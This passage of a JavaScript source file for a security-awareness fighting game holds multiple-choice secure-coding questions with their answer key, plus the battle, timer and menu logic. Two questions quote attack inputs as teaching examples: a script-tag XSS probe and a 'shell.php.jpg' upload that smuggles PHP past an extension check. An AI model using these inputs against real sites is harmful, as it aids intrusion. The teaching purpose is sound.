        answers: ["It scares the user.", "It reveals internal file paths, library versions, and code structure to potential attackers.", "It makes the website load slower.", "It consumes too much ink if the user prints the page."],
        correct: 1
    },
    {
        question: "You are using a third-party library for image processing in your Java app. A \"Remote Code Execution\" (RCE) flaw is found in that library. What is the best course of action?",
        answers: ["Remove the image processing feature entirely.", "Update the library to a secure version or switch to a safe alternative immediately.", "Write a warning on the \"About\" page.", "Use a firewall to block all images."],
        correct: 1
    },
    {
        question: "An attacker tries to upload a file named `shell.php.jpg` to your server. Your code only checks if the filename ends in `.jpg`. If the server is misconfigured to execute PHP, what might happen?",
        answers: ["The file will be ignored.", "The server might execute the malicious PHP code inside the \"image\" file.", "The image will be resized automatically.", "The user's computer will restart."],
        correct: 1
    },
    {
        question: "Your website has a search bar. A user types <script>alert('Hacked')</script> into it, and a pop-up appears. What vulnerability is this?",
        answers: ["SQL Injection.", "Cross-Site Scripting (XSS).", "Denial of Service (DoS).", "Buffer Overflow."],
        correct: 1
    },
    {
        question: "You want to ensure that your website only loads content (images, scripts) from trusted sources you have specified. Which tool do you use?",
        answers: ["A Windows Firewall.", "Content Security Policy (CSP).", "An Anti-Virus software.", "A Router password."],
        correct: 1
    },
    {
        question: "Your mobile app allows users to \"Share\" data with other apps using `Intents`. If you don't validate which app is receiving the data, what is the risk?",
        answers: ["Battery drain.", "Sensitive Data Leakage to a malicious app on the same device.", "The screen might flicker.", "The app will be deleted."],
        correct: 1
    },
    {
        question: "You are coding a \"Logout\" button. Simply redirecting to the home page is not enough. What must your code do to the session?",
        answers: ["Change the user's password.", "Explicitly invalidate the session on the server-side and clear the session cookie.", "Send a \"Goodbye\" email.", "Close the browser window."],
        correct: 1
    },
    {
        question: "You are using an API that requires an `Authorization: Bearer <TOKEN>` header. If you log this token in your server's text files for debugging, what is the risk?",
        answers: ["The log file will get too big.", "Anyone with access to the logs can steal the token and impersonate the user.", "The API will stop working.", "The token will expire faster."],
        correct: 1
    },
    {
        question: "A \"Directory Listing\" vulnerability allows anyone to see all the files in your `/uploads` folder by visiting the URL. How do you fix this via configuration?",
        answers: ["Delete all the files.", "Disable \"Directory Indexing\" in your web server settings (e.g., `.htaccess` or `nginx.conf`).", "Rename the folder to something long.", "Move the folder to the desktop."],
        correct: 1
    },
    {
        question: "You are implementing a feature where users can see their own credit card numbers. How should you display this to minimize risk in case of a \"Shoulder Surfing\" or screen-log attack?",
        answers: ["Show the full number in a large, bold font.", "Mask the number (e.g., `**** **** **** 1234`) and only show it after re-authentication.", "Don't show the number at all, even to the owner.", "Show the number but upside down."],
        correct: 1
    }
];

let activeDifficulty = 1;
let shuffledQuestions = [];
let currentRound = 0;
let playerHealth = 100;
let enemyHealth = 100;
let isAcceptingAnswers = false;
let timerInterval;
let timeLeft = 60;
let correctAnswers = 0;
let incorrectAnswers = 0;
let elapsedSeconds = 0;
let gameStartTime = 0;

const playerBar = document.getElementById("player-health");
const enemyBar = document.getElementById("enemy-health");
const playerSprite = document.getElementById("player-sprite");
const enemySprite = document.getElementById("enemy-sprite");
const enemyNameLabel = document.getElementById("enemy-name");
const stage = document.querySelector(".stage");
const questionText = document.getElementById("question-text");
const answersContainer = document.getElementById("answers-container");
const overlay = document.getElementById("overlay");
const overlayTitle = document.getElementById("overlay-title");
const overlayMsg = document.getElementById("overlay-message");
const timerDisplay = document.getElementById("timer");
const statsBoard = document.getElementById("stats-board");
const statCorrect = document.getElementById("stat-correct");
const statIncorrect = document.getElementById("stat-incorrect");
const statTime = document.getElementById("stat-time");
const restartButton = document.getElementById("restart-button");
const mainMenuButton = document.getElementById("main-menu-button");
const spriteResetTimers = new Map();
const victoryMusic = new Audio("assets/sounds/victory music.mp3");
victoryMusic.loop = true;
const loseMusic = new Audio("assets/sounds/lose music.mp3");
loseMusic.loop = true;
const punchSound = new Audio("assets/sounds/punch1.mp3");
const kickSound = new Audio("assets/sounds/kick.mp3");

const SPRITE_STATES = {
    idle: "is-idle",
    attack: "is-attack",
    hurt: "is-hurt"
};

const SPRITE_ANIMATIONS = {
    player: {
        idle: { name: "Player idle", src: "assets/animations/Defensive_Stance.png", frames: 1, width: 128, height: 128, frameDuration: Infinity, loop: false },
        attack: { name: "Player attack", src: "assets/animations/Punch_1.png", frames: 5, width: 128, height: 128, frameDuration: 110, loop: false },
        hurt: { name: "Player hurt", src: "assets/animations/Hurt.png", frames: 3, width: 128, height: 128, frameDuration: 127, loop: false }
    },
    enemy: {
        idle: { name: "Enemy idle", src: "assets/animations/Defensive_Stance.png", frames: 1, width: 128, height: 128, frameDuration: Infinity, loop: false },
        attack: { name: "Enemy attack", src: "assets/animations/Kick.png", frames: 5, width: 128, height: 128, frameDuration: 110, loop: false },
        hurt: { name: "Enemy hurt", src: "assets/animations/Hurt.png", frames: 3, width: 128, height: 128, frameDuration: 127, loop: false }
    }
};

const spriteControllers = new Map([
    [playerSprite, createSpriteController(playerSprite, "player")],
    [enemySprite, createSpriteController(enemySprite, "enemy")]
]);

const BATTLE_BACKGROUNDS = [
    "assets/backgrounds/Battleground1.png",
    "assets/backgrounds/Battleground2.png",
    "assets/backgrounds/Battleground3.png",
    "assets/backgrounds/Battleground4.png"
];

let previousAnimationTime = 0;

function createSpriteController(sprite, fighterKey) {
    return { sprite, fighterKey, state: "idle", frameIndex: 0, frameTimer: 0 };
}

function getAnimationForSprite(controller) {
    return SPRITE_ANIMATIONS[controller.fighterKey][controller.state];
}

function renderSpriteFrame(controller) {
    const animation = getAnimationForSprite(controller);
    const frameOffset = controller.frameIndex * animation.width;

    controller.sprite.style.backgroundImage = `url("${animation.src}")`;
    controller.sprite.style.backgroundSize = `${animation.frames * animation.width}px ${animation.height}px`;
    controller.sprite.style.backgroundPosition = `-${frameOffset}px 0`;
    controller.sprite.setAttribute("aria-label", animation.name);
}

function setControllerState(controller, state) {
    controller.state = state;
    controller.frameIndex = 0;
    controller.frameTimer = 0;
    renderSpriteFrame(controller);
}

function tickSpriteAnimations(timestamp) {
    if (!previousAnimationTime) {
        previousAnimationTime = timestamp;
    }

    const delta = timestamp - previousAnimationTime;
    previousAnimationTime = timestamp;

    spriteControllers.forEach((controller) => {
        const animation = getAnimationForSprite(controller);
        if (animation.frames <= 1 || !Number.isFinite(animation.frameDuration)) {
            return;
        }

        controller.frameTimer += delta;

        while (controller.frameTimer >= animation.frameDuration) {
            controller.frameTimer -= animation.frameDuration;
            if (controller.frameIndex < animation.frames - 1) {
                controller.frameIndex += 1;
            } else if (animation.loop) {
                controller.frameIndex = 0;
            } else {
                controller.frameTimer = 0;
                break;
            }
        }

        renderSpriteFrame(controller);
    });

    window.requestAnimationFrame(tickSpriteAnimations);
}

function randomizeBattleBackground() {
    const nextBackground = BATTLE_BACKGROUNDS[Math.floor(Math.random() * BATTLE_BACKGROUNDS.length)];
    stage.style.backgroundImage = `url("${nextBackground}")`;
}

function getEndScreenStats() {
    return {
        correct: correctAnswers,
        incorrect: incorrectAnswers,
        time: `${elapsedSeconds}s`
    };
}

function renderStats() {
    const stats = getEndScreenStats();

    statCorrect.innerText = stats.correct;
    statIncorrect.innerText = stats.incorrect;
    statTime.innerText = stats.time;
}

function setSpriteState(sprite, state, resetDelay = 0) {
    const controller = spriteControllers.get(sprite);
    clearTimeout(spriteResetTimers.get(sprite));
    sprite.classList.remove(SPRITE_STATES.idle, SPRITE_STATES.attack, SPRITE_STATES.hurt);
    sprite.classList.add(state);
    setControllerState(controller, state.replace("is-", ""));

    if (resetDelay > 0) {
        const timer = setTimeout(() => {
            sprite.classList.remove(SPRITE_STATES.attack, SPRITE_STATES.hurt);
            sprite.classList.add(SPRITE_STATES.idle);
            setControllerState(controller, "idle");
            spriteResetTimers.delete(sprite);
        }, resetDelay);
        spriteResetTimers.set(sprite, timer);
    }
}

function startCampaign(difficulty = 1) {
    activeMode = "campaign";
    activeDifficulty = difficulty;
    hideCampaignMenu();
    startGame();
}

function startEndless() {
    activeMode = "endless";
    hideCampaignMenu();
    startGame();
}

function startGame() {
    victoryMusic.pause();
    victoryMusic.currentTime = 0;
    loseMusic.pause();
    loseMusic.currentTime = 0;
    stopMainMenuMusic();
    mainGameMusic.currentTime = 0;
    mainGameMusic.play().catch(e => console.log("Audio play blocked:", e));
    currentRound = 0;
    playerHealth = 100;
    enemyHealth = 100;
    correctAnswers = 0;
    incorrectAnswers = 0;
    elapsedSeconds = 0;
    gameStartTime = Date.now();

    let dataSource;
    if (activeMode === "endless") {
        dataSource = [...gameDataIntermediate, ...gameDataAdvanced];
        enemyNameLabel.innerText = "MAXIMUM THREAT";
    } else {
        dataSource = activeDifficulty === 2 ? gameDataAdvanced : gameDataIntermediate;
        enemyNameLabel.innerText = "CYBER THREAT";
    }
    shuffledQuestions = [...dataSource].sort(() => Math.random() - 0.5);
    randomizeBattleBackground();
    updateHealthUI();
    setSpriteState(playerSprite, SPRITE_STATES.idle);
    setSpriteState(enemySprite, SPRITE_STATES.idle);
    statsBoard.classList.add("hidden");
    overlay.classList.add("hidden");
    loadQuestion();
}

function loadQuestion() {
    if (playerHealth <= 0 || (activeMode === "campaign" && enemyHealth <= 0)) {
        endGame();
        return;
    }

    if (currentRound >= shuffledQuestions.length) {
        if (activeMode === "endless") {
            currentRound = 0;
            shuffledQuestions.sort(() => Math.random() - 0.5);
        } else {
            endGame();
            return;
        }
    }

    const data = shuffledQuestions[currentRound];
    questionText.innerText = data.question;
    answersContainer.innerHTML = "";

    const answersToShuffle = data.answers
            .map((text, index) => ({ text, originalIndex: index }));

        for (let i = answersToShuffle.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [answersToShuffle[i], answersToShuffle[j]] = [answersToShuffle[j], answersToShuffle[i]];
        }

    answersToShuffle.forEach((item) => {
        const btn = document.createElement("button");
        btn.classList.add("answer-btn");
        btn.type = "button";
        btn.innerText = item.text;
        btn.dataset.originalIndex = item.originalIndex;
        btn.onclick = () => checkAnswer(item.originalIndex, data.correct);
        answersContainer.appendChild(btn);
    });

    isAcceptingAnswers = true;
    startTimer();
}

function startTimer() {
    clearInterval(timerInterval);
    timeLeft = 60;
    timerDisplay.innerText = timeLeft;
    timerDisplay.style.color = "white";
    timerInterval = setInterval(() => {
        timeLeft -= 1;
        timerDisplay.innerText = timeLeft;
        if (timeLeft <= 10) {
            timerDisplay.style.color = "red";
        }
        if (timeLeft <= 0) {
            handleTimeout();
        }
    }, 1000);
}

function handleTimeout() {
    isAcceptingAnswers = false;
    clearInterval(timerInterval);
    incorrectAnswers += 1;
    const data = shuffledQuestions[currentRound];
    document.querySelectorAll(".answer-btn").forEach((btn) => {
        if (parseInt(btn.dataset.originalIndex, 10) === data.correct) {
            btn.classList.add("correct");
        }
    });
    performAttack("enemy");
    setTimeout(() => {
        currentRound += 1;
        loadQuestion();
    }, 2000);
}

function checkAnswer(selectedIndex, correctIndex) {
    if (!isAcceptingAnswers) {
        return;
    }

    isAcceptingAnswers = false;
    clearInterval(timerInterval);

    const buttons = document.querySelectorAll(".answer-btn");
    if (selectedIndex === correctIndex) {
        correctAnswers += 1;
        buttons.forEach((btn) => {
            if (parseInt(btn.dataset.originalIndex, 10) === selectedIndex) {
                btn.classList.add("correct");
            }
        });
        performAttack("player");
    } else {
        incorrectAnswers += 1;
        buttons.forEach((btn) => {
            const idx = parseInt(btn.dataset.originalIndex, 10);
            if (idx === selectedIndex) {
                btn.classList.add("wrong");
            }
            if (idx === correctIndex) {
                btn.classList.add("correct");
            }
        });
        performAttack("enemy");
    }

    setTimeout(() => {
        currentRound += 1;
        loadQuestion();
    }, 2000);
}

function performAttack(attacker) {
    const isPlayerAttacking = attacker === "player";
    const attackingSprite = isPlayerAttacking ? playerSprite : enemySprite;
    const defendingSprite = isPlayerAttacking ? enemySprite : playerSprite;
    const damagePerHit = 20;

    if (isPlayerAttacking) {
        punchSound.currentTime = 0;
        punchSound.play().catch(e => console.log("Audio play blocked:", e));
    } else {
        kickSound.currentTime = 0;
        kickSound.play().catch(e => console.log("Audio play blocked:", e));
    }

    setSpriteState(attackingSprite, SPRITE_STATES.attack, 550);

    setTimeout(() => {
        if (isPlayerAttacking) {
            if (activeMode === "campaign") {
                enemyHealth -= damagePerHit;
            }
        } else {
            playerHealth -= damagePerHit;
        }

        if (enemyHealth < 0) {
            enemyHealth = 0;
        }
        if (playerHealth < 0) {
            playerHealth = 0;
        }

        setSpriteState(defendingSprite, SPRITE_STATES.hurt, 380);
        updateHealthUI();
    }, 220);
}

function updateHealthUI() {
    playerBar.style.width = `${playerHealth}%`;
    enemyBar.style.width = `${enemyHealth}%`;
    if (playerHealth < 30) {
        playerBar.style.backgroundColor = "red";
    } else if (playerHealth < 60) {
        playerBar.style.backgroundColor = "orange";
    } else {
        playerBar.style.backgroundColor = "#ffe600";
    }
}

function endGame() {
    clearInterval(timerInterval);
    stopMainGameMusic();
    elapsedSeconds = Math.max(1, Math.round((Date.now() - gameStartTime) / 1000));
    setSpriteState(playerSprite, SPRITE_STATES.idle);
    setSpriteState(enemySprite, SPRITE_STATES.idle);
    renderStats();
    statsBoard.classList.remove("hidden");
    overlay.classList.remove("hidden");
    timerDisplay.innerText = "VS";
    
    if (activeMode === "endless") {
        overlayTitle.innerText = "GAME OVER";
        overlayMsg.innerText = `You answered ${correctAnswers} correctly.`;
        overlayTitle.style.color = "red";
        loseMusic.play().catch(e => console.log("Audio play blocked:", e));
    } else {
        if (playerHealth > enemyHealth) {
            overlayTitle.innerText = "VICTORY!";
            overlayMsg.innerText = `Health: ${Math.round(playerHealth)}%`;
            overlayTitle.style.color = "#00ff88";
            victoryMusic.play().catch(e => console.log("Audio play blocked:", e));
        } else {
            overlayTitle.innerText = "GAME OVER";
            overlayMsg.innerText = "You have failed.";
            overlayTitle.style.color = "red";
            loseMusic.play().catch(e => console.log("Audio play blocked:", e));
        }
    }
}

menuItems.forEach((item) => {
    item.addEventListener("mouseenter", handleMenuPointerEnter);
    item.addEventListener("focus", handleMenuPointerEnter);
    item.addEventListener("click", handleMenuClick);
});

difficultyItems.forEach((item) => {
    item.addEventListener("mouseenter", (event) => {
        if (!isDifficultySelectionOpen) return;
        const index = Number(event.currentTarget.dataset.difficulty);
        if (selectedDifficultyIndex !== index) {
            updateSelectedDifficulty(index, true);
        } else {
            playMenuMoveSound();
        }
    });
    item.addEventListener("focus", (event) => {
        if (!isDifficultySelectionOpen) return;
        const index = Number(event.currentTarget.dataset.difficulty);
        if (selectedDifficultyIndex !== index) {
            updateSelectedDifficulty(index, true);
        } else {
            playMenuMoveSound();
        }
    });
    item.addEventListener("click", (event) => {
        if (!isDifficultySelectionOpen) return;
        const index = Number(event.currentTarget.dataset.difficulty);
        updateSelectedDifficulty(index);
        activateDifficultyItem(index);
    });
});

difficultyBackButton.addEventListener("click", () => {
    playMenuSelectSound();
    closeDifficultySelectionPanel();
});

settingsBackButton.addEventListener("click", () => {
    playMenuSelectSound();
    closeSettingsPanel();
});

restartButton.addEventListener("click", () => {
    playMenuSelectSound();
    startGame();
});

mainMenuButton.addEventListener("click", () => {
    playMenuSelectSound();
    victoryMusic.pause();
    victoryMusic.currentTime = 0;
    loseMusic.pause();
    loseMusic.currentTime = 0;
    overlay.classList.add("hidden");    
    campaignMenuOverlay.classList.remove("hidden"); 
    isMenuVisible = true;  
    playMainMenuMusic();
    getItemByIndex(selectedMenuIndex)?.focus();  
});

[restartButton, mainMenuButton, difficultyBackButton, settingsBackButton].forEach((btn) => {
    btn.addEventListener("mouseenter", playMenuMoveSound);
    btn.addEventListener("focus", playMenuMoveSound);
});

document.addEventListener("keydown", handleKeydown);

const startInitialMusic = () => {
    if (isMenuVisible && mainMenuMusic.paused) {
        playMainMenuMusic();
    }
};
document.addEventListener("click", startInitialMusic, { once: true });
document.addEventListener("keydown", startInitialMusic, { once: true });

randomizeBattleBackground();
spriteControllers.forEach(renderSpriteFrame);
window.requestAnimationFrame(tickSpriteAnimations);
updateSelectedMenu(selectedMenuIndex);
